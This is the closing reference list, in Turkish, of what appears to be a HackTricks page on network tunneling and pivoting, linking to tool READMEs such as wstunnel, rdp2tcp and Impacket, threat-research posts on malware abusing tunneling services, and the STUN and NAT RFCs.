- [51] [QEMU ağ iletişimi belgeleri](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI BOFScale kaynak deposu](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: BOF-PE’den CDN Önü Kullanılan Bir Tailnet](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Dev Tunnels CLI komutları](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT: GhostContainer ve Tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - ClingSTUN Linux Backdoor’ı Genel STUN Altyapısını Kötüye Kullanıyor](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - NAT için Oturum Geçiş Yardımcı Programları (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - Tek Noktaya Yayın UDP için NAT Davranış Gereksinimleri](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [Tailcat README](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes - Kothamine malware, ağ tespitinden kaçmak için Tailscale’in tailcat aracını kullanıyor](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
{{#include ../banners/hacktricks-training.md}}
